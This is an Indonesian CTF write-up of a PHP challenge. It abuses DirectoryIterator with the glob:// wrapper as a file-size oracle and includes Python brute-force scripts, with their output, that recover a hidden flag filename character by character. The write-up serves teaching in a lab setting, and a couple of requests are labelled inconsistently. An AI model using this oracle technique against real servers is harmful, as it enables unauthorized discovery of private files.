---
title:  PHP Protocol
updated: 2023-03-28 22:23:53
tags: [writeup]
---

- [Soal](#codespr1337)
  - [Analisis Soal](#codespr1338)
    - [POC](#codespr1339)
     - [Logic Brute Force](#codespr1340)
     - [Penjelasan Logic Brute Force](#codespr1341)
     - [Brute Force Debug](#codespr1342)
     - [Brute Force Debug 2](#codespr1343)
     - [Final Brute Force](#codespr1344)
    - [FLAG](#codespr1345)
  - [Referensi](#codespr1346)


<a id="codespr1337"></a>

# Soal

Diberikan sebauh soal dengan alamat url : [php protocol](http://ctf.iluv.my.id:9999/)

Berikut kodenya 

```php
<?php 
$flag = "/tmp/chall/flag[a-fA-F0-9]{15}.txt";

if (isset($_GET["dir"]) && !empty($_GET["dir"])) {
    foreach (new DirectoryIterator($_GET["dir"]) as $f) {
        echo $f->getSize() . "\n<br>";
    }
} else {
    highlight_file(__FILE__);
}
?>
```

<a id="codespr1338"></a>

## Analisis Soal

- _Variabel_ `$flag` yang diisi dengan path file yang memenuhi pola `/tmp/chall/flag[a-fA-F0-9]{15}.txt`. Variabel ini kemungkinan besar digunakan untuk menyimpan isi file flag yang ingin diambil.

```
$flag = "/tmp/chall/flag[a-fA-F0-9]{15}.txt"; adalah sebuah pernyataan pada bahasa pemrograman PHP yang menetapkan nilai string ke dalam variabel $flag.

Nilai string tersebut adalah /tmp/chall/flag[a-fA-F0-9]{15}.txt, yang merupakan pola atau pattern yang digunakan untuk mencocokkan file yang diinginkan.

Pola tersebut menggunakan regular expression atau ekspresi reguler untuk mencari file dengan nama flag di dalam direktori /tmp/chall/ yang diikuti oleh 15 karakter alfanumerik acak (a-f, A-F, 0-9) dan diakhiri dengan ekstensi .txt.

Dengan kata lain, $flag akan menunjukkan path file yang memenuhi pola tersebut jika ditemukan.
```
- _Struktur percabangan_ `if-else` yang berfungsi untuk mengecek apakah terdapat parameter `dir` pada URL. Jika iya, maka program akan melakukan `iterasi` pada setiap file di dalam `direktori` yang diacu oleh parameter tersebut dan menampilkan `ukuran file` masing-masing. Namun jika parameter `dir` tidak ada atau kosong, maka program akan menampilkan kode PHP dari file tersebut menggunakan fungsi `highlight_file(__FILE__);`.

Sehingga, jika kita mengakses file tersebut melalui URL dengan menambahkan parameter `dir`, maka program akan menampilkan ukuran file-file di dalam direktori tersebut. Namun jika kita mengakses file tersebut tanpa parameter `dir`, maka program akan menampilkan source code-nya.



<a id="codespr1339"></a>

## POC

Kita mencoba memasukan nama direktori yang diberikan `/tmp/chall`

`requests`
```
http://ctf.iluv.my.id:9999/?dir=/tmp/chall
```
`response`
```
764
4096
4096
39
```

Ketika mencoba memasukan `/tmp/chall/chall`

`requests`
```
http://ctf.iluv.my.id:9999/?dir=/tmp/chall/flag
```
`response`
```
This page isn’t working ctf.iluv.my.id is currently unable to handle this request.
HTTP ERROR 500
```
Hmmm.... 

Kita butuh banyak referensi tentang soal ini dengan clue `DirectoryIterator`
bisa lihat dokumentasinya disini `https://www.php.net/manual/en/class.directoryiterator.php`
Terdapat banyak `class` tetapi kita bakal fokus ke class `getSize` yang sudah diberikan pada soal tersebut, bisa baca dokumentasinya disini `https://www.php.net/manual/en/directoryiterator.getsize.php` 

setelah baca dokumentasi `getSize` saya melihat ada `function filesize()` jika kalian scrool dokumentasi sebelumnya pada `getSize` terdapat pada bagian paling terakhir yang mengarah pada `https://www.php.net/manual/en/function.filesize.php` ketika dibaca disitu tertulis :

```
**TIP** As of PHP 5.0.0, this function can also be used with some URL wrappers. Refer to Supported Protocols and Wrappers to determine which wrappers support stat() family of functionality.
```
bisa dilihat disitu tertulis `Supported Protocols and Wrappers` bisa dilihat dokumentasinya disini `https://www.php.net/manual/en/wrappers.php` yang kira-kira isinya seperti ini : 

`Table of Contents`

- file:// — Accessing local filesystem
- http:// — Accessing HTTP(s) URLs
- ftp:// — Accessing FTP(s) URLs
- php:// — Accessing various I/O streams
- zlib:// — Compression Streams
- data:// — Data (RFC 2397)
- glob:// — Find pathnames matching pattern
- phar:// — PHP Archive
- ssh2:// — Secure Shell 2
- rar:// — RAR
- ogg:// — Audio streams
- expect:// — Process Interaction Streams

kita bakal memanfaatkan protokol tersebut yaitu 

- file:// — Accessing local filesystem

`requests`
```
http://ctf.iluv.my.id:9999/?dir=file:///tmp/chall/
```
`response`
```
764
4096
4096
39
```

`requests`
```
http://ctf.iluv.my.id:9999/?dir=file:///tmp/chall/flag
```
`response`
```
This page isn’t working ctf.iluv.my.id is currently unable to handle this request.
HTTP ERROR 500
```

- glob:// — Find pathnames matching pattern

`requests`
```
http://ctf.iluv.my.id:9999/?dir=glob://tmp/chall/
```
`response`
```
764
4096
4096
39
```

`requests`
```
http://ctf.iluv.my.id:9999/?dir=file:///tmp/chall/flag
```
`response`
```
Blank Pages no error
```

`requests`
```
http://ctf.iluv.my.id:9999/?dir=file:///tmp/chall/flag*
```
`response`
```
39
```

`Woaaah i get it`, ternyata isi dari file flag berukuran `39 byte`.

Tanda `*` (bintang) dalam pencarian umumnya digunakan sebagai wildcard atau karakter pengganti.

Ketika menggunakan tanda * dalam pencarian, maka karakter tersebut akan dianggap sebagai pengganti dari satu atau lebih karakter apa pun. Sehingga, apapun karakter yang berada di tempat tanda * tersebut, akan dicocokkan dengan semua karakter yang sesuai dalam pencarian.

Contohnya, jika kita ingin mencari semua file yang berakhiran `.txt` dalam sebuah direktori, kita bisa menggunakan perintah `ls *.txt.` Pada contoh ini, tanda `*` berfungsi sebagai wildcard yang digunakan untuk menggantikan karakter apa pun yang ada di awal nama file dan menemukan semua file yang berakhiran `.txt` atau bisa saja kita simulasikan dengan soal yang diberikan `ls flag*` 

```sh
noob@codes:~$ ls flag*
-rw-rw-r-- 1 noob noob 39 Mar  24 11:39 flag.txt

```

Seperti yang sudah dijelaskan pada `Analisis soal` diatas, soal tersebut memaksa kita untuk melakukan brute force karakter pada file flag. untuk kita mencoba mendapatkan flag tersebut dengan `glob://` 

Sebelum kita pastikan dulu dengan menggunakan python untuk mengakses soal yang diberikan


```python
import requests

url = "http://ctf.iluv.my.id:9999/"

noob = requests.get(
	url,
	params={
		"dir":"glob:///tmp/chall/flag*"
	},
)
print(noob.text)
```
```sh
noob@codes:~$ python chall.py
39

```
<a id="codespr1340"></a>

## Logic Brute Force 

```python
karakter = "abcdefABCDEF0123456789"

clue = list("flag")


for brute in karakter:
	getflag = str("glob:///tmp/chall/" + "".join(clue) + brute)
	print(getflag)
```
```sh
noob@codes:~$ python brute.py
glob:///tmp/chall/flaga
glob:///tmp/chall/flagb
glob:///tmp/chall/flagc
glob:///tmp/chall/flagd
glob:///tmp/chall/flage
glob:///tmp/chall/flagf
glob:///tmp/chall/flagA
glob:///tmp/chall/flagB
glob:///tmp/chall/flagC
glob:///tmp/chall/flagD
glob:///tmp/chall/flagE
glob:///tmp/chall/flagF
glob:///tmp/chall/flag0
glob:///tmp/chall/flag1
glob:///tmp/chall/flag2
glob:///tmp/chall/flag3
glob:///tmp/chall/flag4
glob:///tmp/chall/flag5
glob:///tmp/chall/flag6
glob:///tmp/chall/flag7
glob:///tmp/chall/flag8
glob:///tmp/chall/flag9
```
<a id="codespr1341"></a>

## Penjelasan Logic Brute Force 

Kode diatas merupakan contoh script Python yang digunakan untuk melakukan brute force terhadap sebuah file flag yang berada dalam direktori `/tmp/chall/`.
Pada kode tersebut, terdapat dua variabel yaitu `karakter` dan `clue`. Variabel `karakter` berisi kumpulan karakter yang digunakan untuk melakukan `brute force`, yaitu `abcdefABCDEF0123456789` karakter tersebut didapat dari `$flag = "/tmp/chall/flag[a-fA-F0-9]{15}.txt";` yang sudah dijelaskan sebelumnya pada `Analisis Soal`. Sedangkan variabel `clue` berisi sebuah `list` yang terdiri dari karakter-karakter awal yang sudah diketahui, yaitu `flag`.

Selanjutnya, dilakukan iterasi pada setiap karakter dalam variabel `karakter`. Dalam setiap iterasi, karakter tersebut digabungkan dengan karakter-karakter awal yang sudah diketahui yang tersimpan dalam variabel `clue` menggunakan fungsi `join()`. Selanjutnya, string hasil penggabungan tersebut digunakan sebagai alamat file flag dalam direktori `/tmp/chall/` dengan menambahkan karakter yang sedang diiterasi pada bagian akhir string tersebut.

Setiap alamat file flag yang sudah dibentuk akan ditampilkan pada output menggunakan fungsi `print()`. Dalam contoh ini, proses brute force hanya menampilkan alamat file flag yang mungkin, namun tidak melakukan aksi apapun terhadap file tersebut. Pada implementasi yang sebenarnya, bisa saja dilakukan operasi untuk membuka dan membaca isi file flag tersebut jika alamat file flag berhasil ditemukan melalui proses brute force ini.

<a id="codespr1342"></a>

## Brute Force Debug 

Sekarang kita gabungkan kode tersebut untuk melakukan brute force

```python
import requests

karakter = "abcdefABCDEF0123456789"

clue = list("flag")

url = "http://ctf.iluv.my.id:9999/"

for brute in karakter:
		kirim = str("glob:///tmp/chall/" + "".join(clue) + brute + "*")

		noob = requests.get(
			url,
			params={
				"dir": kirim,
			},
		)
		print(kirim)
		print(noob.text)
```
```sh
noob@codes:~$ python brute-debug.py
glob:///tmp/chall/flaga*

glob:///tmp/chall/flagb*

glob:///tmp/chall/flagc*

glob:///tmp/chall/flagd*

glob:///tmp/chall/flage*

glob:///tmp/chall/flagf*

glob:///tmp/chall/flagA*

glob:///tmp/chall/flagB*

glob:///tmp/chall/flagC*

glob:///tmp/chall/flagD*

glob:///tmp/chall/flagE*

glob:///tmp/chall/flagF*

glob:///tmp/chall/flag0*

glob:///tmp/chall/flag1*
39
glob:///tmp/chall/flag2*

glob:///tmp/chall/flag3*

glob:///tmp/chall/flag4*

glob:///tmp/chall/flag5*

glob:///tmp/chall/flag6*

glob:///tmp/chall/flag7*

glob:///tmp/chall/flag8*

glob:///tmp/chall/flag9*
```
Wooottt terdapat respon `glob:///tmp/chall/flag1*` yang hasil responya menunjukan ukuran size dari file `flag` yaitu `39` byte. 

<a id="codespr1343"></a>

## Brute Force Debug 2

Mari Kita rapikan sedikit kodenya 
```python
import requests

karakter = "abcdefABCDEF0123456789"

clue = list("flag")

url = "http://ctf.iluv.my.id:9999/"

for brute in karakter:
		kirim = str("glob:///tmp/chall/" + "".join(clue) + brute + "*")

		noob = requests.get(
			url,
			params={
				"dir": kirim,
			},
		)
		
		if noob.text == "":
			continue
		else:
			print("Berhasil Mendapatkan karakter : " + brute)
			break
```
```sh
noob@codes:~$ python brute-debug2.py
Berhasil Mendapatkan karakter : 1
```

<a id="codespr1344"></a>

## Final Brute Force

Kita lakukan beberapa perubahan kode untuk bisa mendapatkan nama file tersebut

```python
import requests

karakter = "abcdefABCDEF0123456789"

clue = list("flag")

url = "http://ctf.iluv.my.id:9999/"

while len(clue) != 19:
    for brute in karakter:
        kirim = str("glob:///tmp/chall/" + "".join(clue) + brute + "*")
        noob = requests.get(
            url, 
            params={
            "dir": kirim
            },
        )
        if noob.text == "":
            continue
        else:
            clue.append(brute)
            print("Sukses : " + "".join(clue) + ".txt")
            break
```
```sh
noob@codes:~$ python final-brute.py
Sukses : flag1.txt
Sukses : flag16.txt
Sukses : flag164.txt
Sukses : flag1647.txt
Sukses : flag16474.txt
Sukses : flag164745.txt
Sukses : flag164745e.txt
Sukses : flag164745e7.txt
Sukses : flag164745e79.txt
Sukses : flag164745e796.txt
Sukses : flag164745e7966.txt
Sukses : flag164745e7966f.txt
Sukses : flag164745e7966f6.txt
Sukses : flag164745e7966f6e.txt
Sukses : flag164745e7966f6e4.txt
```

<a id="codespr1345"></a>

## FLAG 

```python
import requests

url = "http://ctf.iluv.my.id:9999/flag164745e7966f6e4.txt"

noob = requests.get(url)

print(noob.text)
```
```sh
noob@codes:~$ python getflag.py
Selamat Menunaikan Ibadah Puasa 1444 H
```

<a id="codespr1346"></a>

## Referensi

-  [DirectoryIterator class](https://www.php.net/manual/en/class.directoryiterator.php)
-  [getSize](https://www.php.net/manual/en/directoryiterator.getsize.php)
-  [function filesize()](https://www.php.net/manual/en/function.filesize.php)
-  [Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)
-  [glob:// — Find pathnames matching pattern](https://www.php.net/manual/en/wrappers.glob.php)
